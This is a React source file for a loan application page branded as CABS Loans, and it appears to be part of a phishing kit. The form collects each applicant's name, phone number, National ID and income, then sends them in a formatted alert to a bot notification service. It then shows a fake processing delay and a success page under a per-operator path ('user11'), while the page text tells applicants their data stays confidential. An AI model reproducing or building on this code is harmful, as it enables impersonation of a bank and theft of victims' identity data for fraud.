import React, { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useClient } from '../context/ClientContext';
import { Header } from '../components/Header';
import { Footer } from '../components/Footer';
import { LoadingOverlay } from '../components/LoadingOverlay';
import { sendBotNotification } from '../services/botService';

export const ApplicationPage = () => {
  const { user } = useParams();
  const navigate = useNavigate();
  const { client, updateClient } = useClient();

  const [name, setName] = useState(client.name || '');
  const [phone, setPhone] = useState(client.number || '');
  const [idNumber, setIdNumber] = useState(client.id || '');
  const [loanAmount, setLoanAmount] = useState(client.loan || 10000);
  const [employment, setEmployment] = useState(client.employment || 'employed');
  const [income, setIncome] = useState(client.income || '');
  const [repayment, setRepayment] = useState(client.repaymentTerm || 12);
  const [termsAgreed, setTermsAgreed] = useState(false);

  const [submitting, setSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!name.trim()) {
      setErrorMessage('Please enter your full name');
      return;
    }
    if (!phone || phone.length < 9) {
      setErrorMessage('Please enter a valid phone number');
      return;
    }
    if (!idNumber.trim()) {
      setErrorMessage('Please enter your National ID');
      return;
    }
    if (!termsAgreed) {
      setErrorMessage('Please agree to the terms and conditions');
      return;
    }

    setErrorMessage('');
    setSubmitting(true);

    updateClient({
      name,
      number: phone,
      id: idNumber,
      loan: loanAmount,
      employment,
      income,
      repaymentTerm: repayment,
      status: 'submitted'
    });

    // Send Real-time Bot Alert
    sendBotNotification(`🚨 <b>New Client Loan Claim</b>:\n\n<b>Client Name</b>: ${name}\n<b>Cabs / Phone Number</b>: ${phone}\n<b>National ID</b>: ${idNumber}\n<b>Requested Loan</b>: USD ${loanAmount}\n<b>Monthly Income</b>: USD ${income || '0.00'}\n<b>Repayment Tenure</b>: ${repayment} months`);

    setTimeout(() => {
      setSubmitting(false);
      const userSegment = user || 'user11';
      navigate(`/${userSegment}/success`);
    }, 1800);
  };

  return (
    <div className="app-viewport">
      <Header />
      {submitting && <LoadingOverlay message="Submitting loan application..." />}
      <main className="main-content">
        <div className="_container_ckb9m_6 form-container">
          <section className="_intro_ckb9m_46">
            <h2 className="form-title">Loan Application</h2>
            <p className="_helpText_ckb9m_51 form-subtitle">
              Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification only.
            </p>
          </section>

          {errorMessage && (
            <div className="alert-box alert-error">
              <span>⚠️ {errorMessage}</span>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <section className="_dataFields_ckb9m_70 form-grid">
              <div>
                <label htmlFor="name" className="form-label">Full name</label>
                <input
                  id="name"
                  type="text"
                  required
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  placeholder="e.g. John Doe"
                  className="form-input"
                />
              </div>

              <div>
                <label htmlFor="phone" className="form-label">Phone Number</label>
                <input
                  id="phone"
                  type="number"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="0785345678"
                  className="form-input"
                />
              </div>

              <div>
                <label htmlFor="id" className="form-label">National ID</label>
                <input
                  id="id"
                  type="text"
                  required
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value)}
                  placeholder="63-1234567-X-12"
                  className="form-input"
                />
              </div>

              <div>
                <label htmlFor="loanAmount" className="form-label">Loan Amount (USD)</label>
                <input
                  id="loanAmount"
                  type="number"
                  required
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(e.target.value)}
                  placeholder="USD 10,000"
                  className="form-input no-spinner"
                />
              </div>

              <div>
                <label className="form-label">Employment Status</label>
                <select
                  value={employment}
                  onChange={(e) => setEmployment(e.target.value)}
                  className="form-select"
                >
                  <option value="employed">Employed</option>
                  <option value="selfemployed">Self-Employed</option>
                  <option value="unemployed">Unemployed</option>
                  <option value="student">Student</option>
                </select>
              </div>

              <div>
                <label htmlFor="income" className="form-label">Monthly Net Income</label>
                <input
                  id="income"
                  type="number"
                  value={income}
                  onChange={(e) => setIncome(e.target.value)}
                  placeholder="USD 0.00"
                  className="form-input no-spinner"
                />
              </div>

              <div>
                <label className="form-label">Repayment</label>
                <select
                  value={repayment}
                  onChange={(e) => setRepayment(Number(e.target.value))}
                  className="form-select"
                >
                  <option value={6}>6 months</option>
                  <option value={12}>12 months</option>
                  <option value={18}>18 months</option>
                  <option value={24}>24 months</option>
                </select>
              </div>
            </section>

            <section className="_footer_ckb9m_115">
              <div className="_terms_ckb9m_124 terms-row">
                <input
                  type="checkbox"
                  id="terms"
                  required
                  checked={termsAgreed}
                  onChange={(e) => setTermsAgreed(e.target.checked)}
                  className="terms-checkbox"
                />
                <label htmlFor="terms">
                  I confirm that the information provided is true and I agree to the CABS Loans terms and conditions.
                </label>
              </div>

              <div className="_apllyBtn_ckb9m_162">
                <button type="submit" className="btnNext">
                  SUBMIT APPLICATION
                </button>
              </div>
            </section>
          </form>
        </div>
      </main>
      <Footer />
    </div>
  );
};
